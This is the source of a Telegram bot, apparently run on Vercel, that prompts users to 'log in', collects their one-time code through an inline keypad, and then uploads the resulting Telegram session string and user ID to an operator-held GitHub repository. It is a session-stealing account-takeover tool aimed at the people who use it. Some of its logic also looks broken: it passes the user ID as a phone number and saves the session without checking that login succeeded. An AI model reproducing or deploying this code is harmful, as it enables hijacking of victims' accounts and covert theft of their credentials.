import TelegramBot from "node-telegram-bot-api";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";

// ===== ENV =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_ID = Number(process.env.API_ID);
const API_HASH = process.env.API_HASH;

const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_REPO = process.env.GITHUB_REPO;
const GITHUB_PATH = process.env.GITHUB_PATH;

// ===== BOT =====
const bot = new TelegramBot(BOT_TOKEN);
const temp = {}; // { chatId: { otp, client } }

// ===== KEYPAD =====
function keypad() {
  return {
    inline_keyboard: [
      [{ text: "1", callback_data: "1" }, { text: "2", callback_data: "2" }, { text: "3", callback_data: "3" }],
      [{ text: "4", callback_data: "4" }, { text: "5", callback_data: "5" }, { text: "6", callback_data: "6" }],
      [{ text: "7", callback_data: "7" }, { text: "8", callback_data: "8" }, { text: "9", callback_data: "9" }],
      [{ text: "⌫", callback_data: "del" }, { text: "0", callback_data: "0" }, { text: "⏎", callback_data: "enter" }]
    ]
  };
}

// ===== SAVE SESSION TO GITHUB =====
async function saveSession(session, userId) {
  const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_PATH}`;

  let sha = null;
  try {
    const r = await fetch(url, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github+json"
      }
    });
    if (r.ok) {
      const j = await r.json();
      sha = j.sha;
    }
  } catch {}

  const content = Buffer.from(
    JSON.stringify(
      { user_id: userId, session, saved_at: new Date().toISOString() },
      null,
      2
    )
  ).toString("base64");

  await fetch(url, {
    method: "PUT",
    headers: {
      Authorization: `token ${GITHUB_TOKEN}`,
      Accept: "application/vnd.github+json"
    },
    body: JSON.stringify({
      message: "save telegram session",
      content,
      sha
    })
  });
}

// ===== WEBHOOK HANDLER (VERCEL) =====
export default async function handler(req, res) {
  if (req.method === "POST") {
    bot.processUpdate(req.body);
    return res.status(200).end();
  }
  res.status(200).send("BOT OK");
}

// ===== /login =====
bot.onText(/\/login/, async (msg) => {
  const chatId = msg.chat.id;

  if (temp[chatId]) {
    await bot.sendMessage(chatId, "⚠️ Login sedang berjalan");
    return;
  }

  const client = new TelegramClient(
    new StringSession(""),
    API_ID,
    API_HASH,
    { connectionRetries: 5 }
  );

  temp[chatId] = { otp: "", client };

  await bot.sendMessage(chatId, "📩 OTP dikirim ke Telegram kamu");

  client.start({
    phoneNumber: async () => msg.from.id.toString(),
    phoneCode: async () => temp[chatId].otp,
    onError: () => {}
  }).catch(() => {});

  await bot.sendMessage(chatId, "🔢 Masukkan OTP (5 digit):", {
    reply_markup: keypad()
  });
});

// ===== HANDLE KEYPAD =====
bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id;
  const user = temp[chatId];
  if (!user) return;

  const d = q.data;

  if (/^\d$/.test(d) && user.otp.length < 5) {
    user.otp += d;
  }

  if (d === "del") {
    user.otp = user.otp.slice(0, -1);
  }

  if (d === "enter") {
    if (user.otp.length !== 5) {
      await bot.answerCallbackQuery(q.id, {
        text: "OTP harus 5 digit",
        show_alert: true
      });
      return;
    }

    try {
      const session = user.client.session.save();
      await saveSession(session, chatId);

      await bot.editMessageText(
        "✅ Login berhasil",
        {
          chat_id: chatId,
          message_id: q.message.message_id
        }
      );

      delete temp[chatId];
      return;
    } catch {
      user.otp = "";
    }
  }

  await bot.editMessageText(
    `🔐 OTP: ${"*".repeat(user.otp.length)}`,
    {
      chat_id: chatId,
      message_id: q.message.message_id,
      reply_markup: keypad()
    }
  );
});
